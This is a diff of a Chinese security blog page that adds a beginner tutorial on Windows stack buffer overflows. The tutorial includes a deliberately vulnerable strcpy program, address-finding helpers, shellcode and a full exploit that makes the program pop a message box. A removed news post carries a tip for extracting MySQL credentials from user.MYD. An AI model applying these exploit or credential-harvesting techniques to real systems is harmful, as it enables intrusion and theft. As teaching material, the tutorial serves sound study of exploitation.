@@ -308,6 +308,142 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2017/08/02/windows栈溢出入门/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="M0rk">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M0rk's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/08/02/windows栈溢出入门/" itemprop="url">
+                  windows栈溢出入门
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-02T17:15:16+08:00">
+                2017-08-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h4 id="概念知识点"><a href="#概念知识点" class="headerlink" title="概念知识点"></a>概念知识点</h4><ul>
+<li>在程序执行的过程中，cpu会不断处理数据，而cpu处理的数据通常来自3个地方<br>1.数据在指令中直接给出<br>2.数据在寄存器中<br>3.数据在内存中<h4 id="漏洞利用原理简介"><a href="#漏洞利用原理简介" class="headerlink" title="漏洞利用原理简介"></a>漏洞利用原理简介</h4>本次实例中的windows缓冲区溢出的原理还是比较简单的，首先使用jmp esp覆盖函数的返回地址，然后esp此时存放的正是shellcode的地址，那么shellcode本来是作为数据的结果被当做指令给执行了。感觉其实和sql注入啊，xss啥的都差不多，都是”数据”被当做代码或者指令给执行了 :)<h4 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	char buffer[8];</div><div class="line">	LoadLibrary(&quot;user32.dll&quot;);</div><div class="line">	strcpy(buffer,name);</div><div class="line">	printf(&quot;%s\n&quot;,buffer);</div><div class="line">	getchar();</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>主要是利用strcpy函数的复制，当name的内容大于buffer的大小时候，这个时候会产生异常，Exception code: C0000005 ACCESS_VIOLATION。</p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>利用栈溢出弹出一个MessageBox的框</p>
+<h4 id="辅助工具代码"><a href="#辅助工具代码" class="headerlink" title="辅助工具代码"></a>辅助工具代码</h4><p>以下代码用于定位user32.dll中的MessageBox以及kernel32.dll中的ExitProcess地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">#include &quot;windows.h&quot;</div><div class="line">#include &quot;stdio.h&quot;</div><div class="line"></div><div class="line">typedef void (*MYPROC)(LPTSTR);</div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	HINSTANCE LibHandle;</div><div class="line">	MYPROC ProcAdd;</div><div class="line">	LibHandle = LoadLibrary(&quot;kernel32&quot;);</div><div class="line">	//LibHandle = LoadLibrary(&quot;user32&quot;);</div><div class="line">	printf(&quot;kernel LibHandle = //x%x\n&quot;,LibHandle);</div><div class="line">	ProcAdd = (MYPROC)GetProcAddress(LibHandle,&quot;ExitProcess&quot;);</div><div class="line">	//ProcAdd = (MYPROC)GetProcAddress(LibHandle,&quot;MessageBoxA&quot;);</div><div class="line">	printf(&quot;system = //x%x\n&quot;,ProcAdd);</div><div class="line"></div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>以下代码用于发现user32.dll(当然其它dll中也存在jmp esp操作码的地址)中jmp esp的操作码的地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">#include &quot;windows.h&quot;</div><div class="line">#include &quot;stdio.h&quot;</div><div class="line">#include &quot;stdlib.h&quot;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">		BYTE *ptr;</div><div class="line">		int position;</div><div class="line">		HINSTANCE handle;</div><div class="line">		BOOL done_flag = FALSE;</div><div class="line">		handle = LoadLibrary(&quot;user32.dll&quot;);</div><div class="line">		if(!handle)</div><div class="line">		&#123;</div><div class="line">			printf(&quot;Load dll error&quot;);</div><div class="line">			exit(0);</div><div class="line">		&#125;</div><div class="line">		ptr = (BYTE*)handle;</div><div class="line"></div><div class="line">		for(position = 0; !done_flag; position++ )</div><div class="line">		&#123;</div><div class="line">			try</div><div class="line">			&#123;</div><div class="line">				if(ptr[position]==0xFF &amp;&amp; ptr[position+1]==0xE4)</div><div class="line">				&#123;</div><div class="line">					int address = (int)ptr + position;</div><div class="line">					printf(&quot;OPCODE found at 0x%x\n&quot;,address);</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">			catch(...)</div><div class="line">			&#123;</div><div class="line">				int address = (int)ptr + position;</div><div class="line">				printf(&quot;END OPCODE found at 0x%x\n&quot;,address);</div><div class="line">				done_flag = true;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">		getchar();</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h4 id="汇编利用代码实现"><a href="#汇编利用代码实现" class="headerlink" title="汇编利用代码实现"></a>汇编利用代码实现</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">#include &quot;windows.h&quot;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	_asm&#123;</div><div class="line">		sub esp,0x50</div><div class="line">		xor ebx,ebx</div><div class="line">		push ebx</div><div class="line">		push 0x20676e69</div><div class="line">		push 0x6e726157  //push &quot;Warning&quot;</div><div class="line">		mov eax,esp</div><div class="line">		push ebx</div><div class="line">		push 0x20202021    //push &quot;you have been hacked by M0rk!&quot;</div><div class="line">		push 0x6b72304d</div><div class="line">		push 0x20796220</div><div class="line">		push 0x64656b63</div><div class="line">		push 0x6168206e</div><div class="line">		push 0x65656220</div><div class="line">		push 0x65766168</div><div class="line">		push 0x20756f79</div><div class="line">		mov ecx,esp</div><div class="line">			</div><div class="line">		push ebx</div><div class="line">		push eax</div><div class="line">		push ecx</div><div class="line">		push ebx</div><div class="line">		mov eax,0x761aea99</div><div class="line">		call eax</div><div class="line">		push ebx</div><div class="line">		mov eax,0x7700be52</div><div class="line">        call eax</div><div class="line">	&#125;</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h4 id="shellcode编写"><a href="#shellcode编写" class="headerlink" title="shellcode编写"></a>shellcode编写</h4><p>通过ollydbg或者<a href="https://3gstudent.github.io/3gstudent.github.io/Windows-Shellcode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E9%80%9A%E8%BF%87VisualStudio%E7%94%9F%E6%88%90shellcode/" target="_blank" rel="external">vs</a>查看机器码<br>或者<a href="http://brieflyx.me/2015/linux-tools/msfvenom-intro/" target="_blank" rel="external">msf</a>生成<br>机器码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">83EC 50</div><div class="line">33DB</div><div class="line">53</div><div class="line">68 696E6720</div><div class="line">68 5761726E</div><div class="line">8BC4</div><div class="line">53</div><div class="line">68 21202020</div><div class="line">68 4D30726B</div><div class="line">68 20627920</div><div class="line">68 636B6564</div><div class="line">68 6E206861</div><div class="line">68 20626565</div><div class="line">68 68617665</div><div class="line">68 796F7520</div><div class="line">8BCC</div><div class="line">53</div><div class="line">50</div><div class="line">51</div><div class="line">53</div><div class="line">B8 99EA1A76</div><div class="line">FFD0</div><div class="line">53</div><div class="line">B8 52BE0077</div><div class="line">FFD0</div></pre></td></tr></table></figure></p>
+<p>所以对应的shellcode是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">&quot;\x83\xEC\x50&quot;</div><div class="line">  &quot;\x33\xDB&quot;</div><div class="line">  &quot;\x53&quot;</div><div class="line">  &quot;\x68\x69\x6E\x67\x20&quot;</div><div class="line">  &quot;\x68\x57\x61\x72\x6E&quot;</div><div class="line">  &quot;\x8B\xC4&quot;</div><div class="line">  &quot;\x53&quot;</div><div class="line">  &quot;\x68\x21\x20\x20\x20&quot;</div><div class="line">  &quot;\x68\x4D\x30\x72\x6B&quot;</div><div class="line">  &quot;\x68\x20\x62\x79\x20&quot;</div><div class="line">  &quot;\x68\x63\x6B\x65\x64&quot;</div><div class="line">  &quot;\x68\x6E\x20\x68\x61&quot;</div><div class="line">  &quot;\x68\x20\x62\x65\x65&quot;</div><div class="line">  &quot;\x68\x68\x61\x76\x65&quot;</div><div class="line">  &quot;\x68\x79\x6F\x75\x20&quot;</div><div class="line">  &quot;\x8B\xCC&quot;</div><div class="line">  &quot;\x53&quot;</div><div class="line">  &quot;\x50&quot;</div><div class="line">  &quot;\x51&quot;</div><div class="line">  &quot;\x53&quot;</div><div class="line">  &quot;\xB8\x99\xEA\xF0\x75&quot;</div><div class="line">  &quot;\xFF\xD0&quot;</div><div class="line">  &quot;\x53&quot;</div><div class="line">  &quot;\xB8\x52\xBE\xC0\x76&quot;</div><div class="line">  &quot;\xFF\xD0&quot;;</div></pre></td></tr></table></figure></p>
+<h4 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">#include &quot;windows.h&quot;</div><div class="line">#include &quot;stdio.h&quot;</div><div class="line">#include &quot;string.h&quot;</div><div class="line"></div><div class="line">char name[] = &quot;\x41\x41\x41\x41\x41\x41\x41\x41&quot;</div><div class="line">              &quot;\x41\x41\x41\x41&quot;   //ebp</div><div class="line">			  &quot;\xb3\xa0\xf6\x75&quot;   //Return address \xb3\xa0\x20\x76</div><div class="line">			  &quot;\x83\xEC\x50&quot;</div><div class="line">			  &quot;\x33\xDB&quot;</div><div class="line">			  &quot;\x53&quot;</div><div class="line">			  &quot;\x68\x69\x6E\x67\x20&quot;</div><div class="line">			  &quot;\x68\x57\x61\x72\x6E&quot;</div><div class="line">			  &quot;\x8B\xC4&quot;</div><div class="line">			  &quot;\x53&quot;</div><div class="line">			  &quot;\x68\x21\x20\x20\x20&quot;</div><div class="line">			  &quot;\x68\x4D\x30\x72\x6B&quot;</div><div class="line">			  &quot;\x68\x20\x62\x79\x20&quot;</div><div class="line">			  &quot;\x68\x63\x6B\x65\x64&quot;</div><div class="line">			  &quot;\x68\x6E\x20\x68\x61&quot;</div><div class="line">			  &quot;\x68\x20\x62\x65\x65&quot;</div><div class="line">			  &quot;\x68\x68\x61\x76\x65&quot;</div><div class="line">			  &quot;\x68\x79\x6F\x75\x20&quot;</div><div class="line">			  &quot;\x8B\xCC&quot;</div><div class="line">			  &quot;\x53&quot;</div><div class="line">			  &quot;\x50&quot;</div><div class="line">			  &quot;\x51&quot;</div><div class="line">			  &quot;\x53&quot;</div><div class="line">			  &quot;\xB8\x99\xEA\xF0\x75&quot;</div><div class="line">			  &quot;\xFF\xD0&quot;</div><div class="line">			  &quot;\x53&quot;</div><div class="line">			  &quot;\xB8\x52\xBE\xC0\x76&quot;</div><div class="line">			  &quot;\xFF\xD0&quot;;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	char buffer[8];</div><div class="line">	LoadLibrary(&quot;user32.dll&quot;);</div><div class="line">	strcpy(buffer,name);</div><div class="line">	printf(&quot;%s\n&quot;,buffer);</div><div class="line">	getchar();</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><img src="/2017/08/02/windows栈溢出入门/1.png" alt=""></p>
+<h4 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h4><ul>
+<li><a href="http://bbs.pediy.com/search-_E5_8E_9F_E5_88_9B_5DOllyDBG_20_E5_85_A5_E9_97_A8_E7_B3_BB_E5_88_97.htm" target="_blank" rel="external">OllyDBG 入门系列</a><br><a href="http://blog.csdn.net/niexinming/article/details/78144301" target="_blank" rel="external">覆盖虚表方式利用栈溢出漏洞</a><h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li>
+<li><a href="https://www.youtube.com/watch?v=aEZKGW_VTd4" target="_blank" rel="external">Hacker Course Buffer Overflow - A Practical Example</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2017/08/02/20170802安全动态/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -941,7 +1077,7 @@
 </li>
 <li>MFC 程序入口和执行流程<br><a href="http://www.cnblogs.com/mrchang/archive/2013/05/01/3053092.html" target="_blank" rel="external">http://www.cnblogs.com/mrchang/archive/2013/05/01/3053092.html</a></li>
 <li>How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE!<br><a href="http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html" target="_blank" rel="external">http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html</a></li>
-<li>Petya 内网传播分析<br><a href="&#x6d;&#97;&#x69;&#108;&#116;&#x6f;&#58;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#47;&#x70;&#117;&#114;&#112;&#108;&#101;&#114;&#x6f;&#99;&#x2e;&#99;&#111;&#x6d;&#x2f;&#x4d;&#68;&#x2f;&#50;&#x30;&#x31;&#x37;&#45;&#x30;&#54;&#x2d;&#x32;&#56;&#64;&#72;&#x6f;&#x77;&#x25;&#50;&#48;&#100;&#x6f;&#x65;&#x73;&#37;&#50;&#x30;&#80;&#x65;&#x74;&#121;&#x61;&#37;&#x32;&#48;&#115;&#112;&#114;&#x65;&#x61;&#100;&#x25;&#50;&#48;&#105;&#110;&#37;&#x32;&#48;&#76;&#65;&#x4e;&#46;&#104;&#x74;&#109;&#108;">&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#47;&#x70;&#117;&#114;&#112;&#108;&#101;&#114;&#x6f;&#99;&#x2e;&#99;&#111;&#x6d;&#x2f;&#x4d;&#68;&#x2f;&#50;&#x30;&#x31;&#x37;&#45;&#x30;&#54;&#x2d;&#x32;&#56;&#64;&#72;&#x6f;&#x77;&#x25;&#50;&#48;&#100;&#x6f;&#x65;&#x73;&#37;&#50;&#x30;&#80;&#x65;&#x74;&#121;&#x61;&#37;&#x32;&#48;&#115;&#112;&#114;&#x65;&#x61;&#100;&#x25;&#50;&#48;&#105;&#110;&#37;&#x32;&#48;&#76;&#65;&#x4e;&#46;&#104;&#x74;&#109;&#108;</a></li>
+<li>Petya 内网传播分析<br><a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#x68;&#116;&#116;&#112;&#x3a;&#x2f;&#x2f;&#x70;&#x75;&#114;&#112;&#108;&#101;&#x72;&#x6f;&#x63;&#46;&#x63;&#x6f;&#x6d;&#x2f;&#77;&#x44;&#47;&#50;&#x30;&#49;&#55;&#45;&#48;&#x36;&#x2d;&#x32;&#x38;&#64;&#72;&#111;&#x77;&#x25;&#50;&#x30;&#100;&#111;&#101;&#115;&#37;&#50;&#x30;&#x50;&#x65;&#116;&#x79;&#97;&#37;&#50;&#48;&#115;&#x70;&#x72;&#101;&#x61;&#100;&#x25;&#x32;&#48;&#x69;&#x6e;&#x25;&#50;&#48;&#x4c;&#x41;&#78;&#x2e;&#x68;&#x74;&#x6d;&#108;">&#x68;&#116;&#116;&#112;&#x3a;&#x2f;&#x2f;&#x70;&#x75;&#114;&#112;&#108;&#101;&#x72;&#x6f;&#x63;&#46;&#x63;&#x6f;&#x6d;&#x2f;&#77;&#x44;&#47;&#50;&#x30;&#49;&#55;&#45;&#48;&#x36;&#x2d;&#x32;&#x38;&#64;&#72;&#111;&#x77;&#x25;&#50;&#x30;&#100;&#111;&#101;&#115;&#37;&#50;&#x30;&#x50;&#x65;&#116;&#x79;&#97;&#37;&#50;&#48;&#115;&#x70;&#x72;&#101;&#x61;&#100;&#x25;&#x32;&#48;&#x69;&#x6e;&#x25;&#50;&#48;&#x4c;&#x41;&#78;&#x2e;&#x68;&#x74;&#x6d;&#108;</a></li>
 <li>PROFTPD-1.3.3C后门分析<br><a href="http://whereisk0shl.top/post/proftpd-1.3.3chou-men-fen-xi" target="_blank" rel="external">http://whereisk0shl.top/post/proftpd-1.3.3chou-men-fen-xi</a></li>
 <li>BurpSuite插件：利用BurpSuite Spider收集子域名和相似域名<br><a href="http://www.polaris-lab.com/index.php/archives/349/" target="_blank" rel="external">http://www.polaris-lab.com/index.php/archives/349/</a></li>
 <li><p>Skype-Type：一款keyboard acoustic eavesdropping工具<br><a href="https://github.com/SPRITZ-Research-Group/Skype-Type" target="_blank" rel="external">https://github.com/SPRITZ-Research-Group/Skype-Type</a></p>
@@ -1604,163 +1740,11 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2017/07/25/20170725安全动态/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="M0rk">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="M0rk's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/07/25/20170725安全动态/" itemprop="url">
-                  20170725安全动态
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-25T08:58:35+08:00">
-                2017-07-25
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h4 id="每日安全动态"><a href="#每日安全动态" class="headerlink" title="每日安全动态"></a>每日安全动态</h4><ul>
-<li>一个机器学习社区<br><a href="http://paper.kakapo.ml/" target="_blank" rel="external">http://paper.kakapo.ml/</a></li>
-<li>The ThreatHunter Playbook - 专注威胁检测一个 GitHub 项目<br><a href="https://github.com/Cyb3rWard0g/ThreatHunter-Playbook" target="_blank" rel="external">https://github.com/Cyb3rWard0g/ThreatHunter-Playbook</a></li>
-<li>精选 HackerOne 这一年 6 个有趣的安全漏洞<br><a href="http://paper.seebug.org/358/" target="_blank" rel="external">http://paper.seebug.org/358/</a></li>
-<li>目标信息信息搜集的一个工具<br><a href="https://github.com/UltimateHackers/ReconDog" target="_blank" rel="external">https://github.com/UltimateHackers/ReconDog</a></li>
-<li>获取来源IP地址的正确姿势<br><a href="http://www.freebuf.com/articles/web/140669.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/140669.html</a></li>
-<li>Web Sight社区版 – 企业攻击面枚举工具<br><a href="https://l.avala.mp/?p=209" target="_blank" rel="external">https://l.avala.mp/?p=209</a></li>
-<li><p>Little Trick<br><img src="/2017/07/25/20170725安全动态/1.png" alt=""></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">在渗透测试过程中，如果能够拿到mysql目录下的user.MYD文件，这个时候使用十六进制编辑工具，可以获取到mysql用户的账号和密码，然后去相关网站解密就可以了。</div></pre></td></tr></table></figure>
-</li>
-<li><p>二进制师傅们的博客<br><a href="http://wangzhixian.org/%E5%90%84%E4%BD%8D%E5%B8%88%E5%82%85%E7%9A%84%E5%8D%9A%E5%AE%A2" target="_blank" rel="external">http://wangzhixian.org/%E5%90%84%E4%BD%8D%E5%B8%88%E5%82%85%E7%9A%84%E5%8D%9A%E5%AE%A2</a></p>
-</li>
-<li>没有绝对安全的系统：写在AES 256破解之后<br><a href="http://www.freebuf.com/column/141603.html" target="_blank" rel="external">http://www.freebuf.com/column/141603.html</a></li>
-<li><p>信任问题：利用TrustZone TEE</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">project zero 出品，还没看懂:(</div></pre></td></tr></table></figure>
-</li>
-<li><p>Bright City: 针对国外一款市政相关APP的安全性分析<br><a href="https://randywestergren.com/bright-city-highly-insecure-police-municipal-government-app/" target="_blank" rel="external">https://randywestergren.com/bright-city-highly-insecure-police-municipal-government-app/</a></p>
-</li>
-<li>一款基于PHP的漏洞扫描器<br><a href="https://github.com/dermotblair/webvulscan" target="_blank" rel="external">https://github.com/dermotblair/webvulscan</a></li>
-<li>旧瓶新酒之ngx_lua &amp; fail2ban实现主动诱捕<br><a href="https://www.secpulse.com/archives/59444.html" target="_blank" rel="external">https://www.secpulse.com/archives/59444.html</a></li>
-<li>Flash漏洞利用之“喜闻乐见”<br><a href="http://www.freebuf.com/vuls/141405.html" target="_blank" rel="external">http://www.freebuf.com/vuls/141405.html</a></li>
-<li>无线键盘易被监听，不知不觉导致信息泄露<br><a href="http://www.freebuf.com/geek/140951.html" target="_blank" rel="external">http://www.freebuf.com/geek/140951.html</a></li>
-<li>逆向入门学习——看雪CTF2017第3题 爱琴海CrackMe bailianmen2017-07-25 首发专栏：百炼门<br>关注<br><a href="http://www.freebuf.com/column/141147.html" target="_blank" rel="external">http://www.freebuf.com/column/141147.html</a></li>
-<li>HTTPS真的就是安全的象征吗？HTTPS检查工具带来的安全威胁<br><a href="http://www.freebuf.com/news/136565.html" target="_blank" rel="external">http://www.freebuf.com/news/136565.html</a></li>
-<li><p>查看windows management framework 以及ps版本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">更新之前</div><div class="line"> PS C:\Users\Brian&gt; $PSVersionTable</div><div class="line"></div><div class="line">Name                           Value</div><div class="line">----                           -----</div><div class="line">CLRVersion                     2.0.50727.5485</div><div class="line">BuildVersion                   6.1.7601.17514</div><div class="line">PSVersion                      2.0</div><div class="line">WSManStackVersion              2.0</div><div class="line">PSCompatibleVersions           &#123;1.0, 2.0&#125;</div><div class="line">SerializationVersion           1.1.0.1</div><div class="line">PSRemotingProtocolVersion      2.1</div><div class="line"></div><div class="line"></div><div class="line">PS C:\Users\Brian&gt; $PSVersionTable.WSManStackVersion.Major</div><div class="line">2</div><div class="line">PS C:\Users\Brian&gt;</div><div class="line">更新之后：</div><div class="line">PS C:\Users\chq&gt; $PSVersionTable</div><div class="line"></div><div class="line">Name                           Value</div><div class="line">----                           -----</div><div class="line">PSVersion                      5.0.10586.117</div><div class="line">PSCompatibleVersions           &#123;1.0, 2.0, 3.0, 4.0...&#125;</div><div class="line">BuildVersion                   10.0.10586.117</div><div class="line">CLRVersion                     4.0.30319.42000</div><div class="line">WSManStackVersion              3.0</div><div class="line">PSRemotingProtocolVersion      2.3</div><div class="line">SerializationVersion           1.1.0.1</div><div class="line"></div><div class="line"></div><div class="line">PS C:\Users\chq&gt;</div><div class="line">下面是mac版的powershell：</div><div class="line">PS /usr/share&gt; $PSVersionTable                                                                                                                                                                           </div><div class="line"></div><div class="line">Name                           Value                                                                                                                                                                    </div><div class="line">----                           -----                                                                                                                                                                    </div><div class="line">PSVersion                      6.0.0-beta                                                                                                                                                               </div><div class="line">PSEdition                      Core                                                                                                                                                                     </div><div class="line">GitCommitId                    v6.0.0-beta.3                                                                                                                                                            </div><div class="line">OS                             Darwin 16.6.0 Darwin Kernel Version 16.6.0: Fri Apr 14 16:21:16 PDT 2017; root:xnu-3789.60.24~6/RELEASE_X86_64                                                           </div><div class="line">Platform                       Unix                                                                                                                                                                     </div><div class="line">PSCompatibleVersions           &#123;1.0, 2.0, 3.0, 4.0...&#125;                                                                                                                                                  </div><div class="line">PSRemotingProtocolVersion      2.3                                                                                                                                                                      </div><div class="line">SerializationVersion           1.1.0.1                                                                                                                                                                  </div><div class="line">WSManStackVersion              3.0                                                                                                                                                                      </div><div class="line"></div><div class="line"></div><div class="line">PS /usr/share&gt;</div></pre></td></tr></table></figure>
-</li>
-<li><p>新版powershell 支持多种文件hash校验</p>
